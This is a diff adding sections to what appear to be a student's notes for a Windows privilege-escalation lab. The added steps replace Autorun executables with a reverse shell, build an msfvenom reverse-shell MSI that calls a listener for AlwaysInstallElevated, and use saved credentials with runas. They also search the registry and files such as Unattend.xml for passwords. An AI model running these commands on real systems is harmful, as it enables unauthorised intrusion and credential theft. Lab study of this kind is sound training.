@@ -176,3 +176,65 @@ Using accesschk.exe, the service binary is writable by everyone: ```C:\PrivEsc\a
 Copy the reverse shell and replace it: ```copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y```
 
 Run the SYSTEM privileges: ```net start filepermsvc```
+
+# Registry Exploits
+
+# Autoruns
+Windows can be configured to run commands at startup with elevated privileges. 
+
+These Autoruns are configured in the Registry. If you are able to write to an Autorun executable, and are able  to restart the system (or wait for it to be restarted) you may be able to escalate privileges. 
+
+# Task 7 Registry - Autoruns
+
+Query the registry for Autorun executables: ```reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run```
+
+Using accesschk.exe, noting that it is writable: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```
+
+Copy the reverse.exe to Autorun: ```copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y```
+
+# AlwaysInstallElevated
+ MSI files are packages files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated privileges. 
+
+ Resources:
+ 1. https://learn.microsoft.com/en-us/windows/win32/msi/standard-installer-command-line-options
+ 2. https://www.pdq.com/blog/msi-vs-exe-the-battle-of-the-installers/
+
+# Task 8 Registry - AlwaysInstallElevated
+
+Query the registry: 
+```reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Generate the reverse shell with .msi extension:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+```
+Trigger: ```msiexec /quiet /qn /i C:\PrivEsc\reverse.msi```
+
+#  Passwords
+
+Query: ```reg query HKLM /f password /t REG_SZ /s``` or ```reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"```
+
+Usage winexe
+
+Resource: https://www.kali.org/tools/winexe/
+
+# Saved Credentials
+
+Windows has a runas command to allow to run commands under a user with privileges. Windows also allows users to save theit credentials to the system, and these saved credentials can be used to bypass this requirement. 
+
+List any saaved credentials. ``` cmdkey /list ```
+
+Using runas with the admins creds: ```runas /savecred /user:admin C:\PrivEsc\reverse.exe```
+
+Resource: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)
+
+# Configuration Files
+Some administrators will lieave configurations files on the system with passwordsin them. The Unattend.xml is an example.
+
+Recursively search file with pass in the name, or ending: ``` > dir /s *pass* == *.config```
+
+Recursively search for files that contains the word "password" with such endings ```> findstr /si password *xml *.ini *.txt```
+
+```C:\PrivEsc>type C:\Windows\Panther\Unattend.xml```
